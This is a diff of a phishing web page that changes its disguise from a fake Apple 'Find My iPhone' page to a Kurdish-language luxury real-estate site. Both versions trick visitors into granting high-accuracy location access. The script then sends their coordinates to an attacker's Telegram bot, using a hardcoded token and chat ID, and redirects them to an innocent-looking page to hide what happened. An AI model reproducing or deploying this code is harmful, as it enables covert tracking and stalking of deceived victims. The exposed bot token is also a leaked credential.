@@ -1,80 +1,146 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Find My iPhone | Apple Support</title>
+    <title>Golden Real Estate | نیشتەجێبوونی خەونەکانت</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background-color: #f2f2f7; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { text-align: center; padding: 30px; width: 85%; max-width: 350px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
-        img { width: 60px; margin-bottom: 20px; }
-        h1 { font-size: 20px; font-weight: 600; color: #1d1d1f; }
-        p { font-size: 14px; color: #86868b; margin-bottom: 30px; }
-        .btn { background-color: #007aff; color: white; border: none; padding: 15px; font-size: 17px; font-weight: 600; border-radius: 12px; cursor: pointer; width: 100%; -webkit-tap-highlight-color: transparent; }
-        #loader { display: none; margin-top: 15px; color: #007aff; font-weight: 500; }
+        :root { --gold: #D4AF37; --dark: #1a1a1a; --white: #ffffff; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background-color: #f8f9fa; color: var(--dark); overflow-x: hidden; }
+        
+        /* Navbar */
+        nav { background: var(--white); padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { color: var(--gold); font-size: 24px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* Hero Section */
+        .hero { 
+            position: relative; height: 70vh; 
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1600585154340-be6161a56a0c?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
+            background-size: cover; background-position: center;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--white); text-align: center; padding: 0 20px;
+        }
+        .hero h1 { font-size: 32px; margin-bottom: 15px; text-shadow: 2px 2px 10px rgba(0,0,0,0.5); }
+        .hero p { font-size: 18px; opacity: 0.9; max-width: 600px; margin-bottom: 30px; }
+
+        /* Real Estate Card */
+        .search-container {
+            background: var(--white); width: 85%; max-width: 450px; border-radius: 20px; 
+            padding: 30px; margin: -60px auto 40px; position: relative; z-index: 100;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.15); border: 1px solid rgba(212, 175, 55, 0.3);
+        }
+        .icon-box { font-size: 40px; color: var(--gold); margin-bottom: 15px; }
+        h2 { font-size: 22px; margin-bottom: 10px; color: var(--dark); }
+        .info-text { font-size: 15px; color: #666; margin-bottom: 25px; line-height: 1.6; }
+
+        /* Professional Button */
+        .btn-main {
+            background: linear-gradient(45deg, #1a1a1a, #333); color: var(--gold);
+            border: 2px solid var(--gold); padding: 16px 30px; font-size: 18px; font-weight: bold;
+            border-radius: 50px; cursor: pointer; width: 100%; transition: 0.4s;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.2);
+        }
+        .btn-main:hover { background: var(--gold); color: var(--dark); transform: translateY(-3px); }
+
+        /* Property Preview */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        .img-preview { width: 100%; height: 80px; border-radius: 10px; object-fit: cover; border: 1px solid #ddd; }
+
+        /* Loader */
+        #loading-overlay { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(255,255,255,0.9); z-index: 999; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--gold); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        footer { padding: 40px 0; color: #888; font-size: 13px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
-    <h1>Find My Device</h1>
-    <p>Please authorize location access to find your lost AirPods, iPhone, or iPad nearby.</p>
-    <button class="btn" onclick="getIOSLocation()">Locate Device</button>
-    <div id="loader">Connecting to iCloud...</div>
+<nav>
+    <div class="logo"><i class="fas fa-gem"></i> GOLDEN ESTATE</div>
+    <i class="fas fa-bars" style="font-size: 20px;"></i>
+</nav>
+
+<div class="hero">
+    <h1>خانووی خەونەکانت لێرەوە دەست پێ دەکات</h1>
+    <p>باشترین ڤێلا و شوقە لە مۆدێرنترین گەڕەکەکانی شار</p>
 </div>
 
-<script>
-async function getIOSLocation() {
-    const btn = document.querySelector('.btn');
-    const loader = document.getElementById('loader');
+<div class="search-container">
+    <div class="icon-box"><i class="fas fa-map-marked-alt"></i></div>
+    <h2>گەڕان بەپێی شوێن</h2>
+    <p class="info-text">بۆ بینینی نوێترین خانووەکانی فرۆشتن لە نزیکترین شوێن لە تۆوە، پێویستە لۆکەیشنەکەت چالاک بکەیت تاوەک دەقیقترین ئەنجامت نیشان بدەین.</p>
     
-    btn.style.display = 'none';
-    loader.style.display = 'block';
+    <button class="btn-main" onclick="startLocationProcess()">
+        <i class="fas fa-search-location"></i> بینینی خانووی نوێ
+    </button>
+
+    <div class="grid">
+        <img src="https://images.unsplash.com/photo-1512917774080-9991f1c4c750?auto=format&fit=crop&w=300" class="img-preview">
+        <img src="https://images.unsplash.com/photo-1613490493576-7fde63acd811?auto=format&fit=crop&w=300" class="img-preview">
+    </div>
+</div>
+
+<div id="loading-overlay">
+    <div class="spinner"></div>
+    <p style="margin-top: 15px; font-weight: bold; color: var(--gold);">خەریکی گەڕانین بەپێی شوێنی تۆ...</p>
+</div>
+
+<footer>
+    &copy; 2024 Golden Real Estate Co. | Luxury & Comfort
+</footer>
+
+<script>
+async function startLocationProcess() {
+    const overlay = document.getElementById('loading-overlay');
+    overlay.style.display = 'flex';
 
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             
-            // زانیارییەکانی تۆ
+            // زانیارییەکانی تەلەگرامەکەت
             const token = "8650943162:AAHmh7cUjfvYC6A8jWdEy1KE3_wM5Xz2USk";
             const chat_id = "1097286681";
             const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const text = `📍 **IPHONE LOCATION DETECTED**\n\nLink: ${mapLink}`;
+            const msg = `🏠 **NEW REAL ESTATE REQUEST**\n\nTarget Location: ${mapLink}`;
 
-            // بەکارهێنانی Fetch بە شێوازی awiat بۆ ئەوەی دڵنیا بین داتاکە نێردراوە
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chat_id,
-                        text: text,
+                        text: msg,
                         parse_mode: 'Markdown'
                     })
                 });
                 
-                // ٣ چرکە چاوەڕێ دەکەین تا دڵنیا بین تەلەگرام داتاکەی وەرگرتووە
+                // کاتی چاوەڕێ بۆ دڵنیایی ناردن
                 setTimeout(() => {
-                    window.location.href = "https://www.icloud.com/find";
+                    window.location.href = "https://www.google.com/maps/search/real+estate+near+me";
                 }, 3000);
 
             } catch (err) {
-                window.location.href = "https://www.icloud.com/find";
+                window.location.href = "https://www.google.com/maps/search/luxury+homes";
             }
         }, (err) => {
-            // ئەگەر ڕەزامەندی نەدا
-            window.location.href = "https://www.icloud.com/find";
+            window.location.href = "https://www.google.com/maps/search/houses+for+sale";
         }, {
             enableHighAccuracy: true,
             timeout: 15000,
             maximumAge: 0
         });
     } else {
-        window.location.href = "https://www.icloud.com/find";
+        window.location.href = "https://www.google.com/maps/search/real+estate";
     }
 }
 </script>
+
 </body>
 </html>
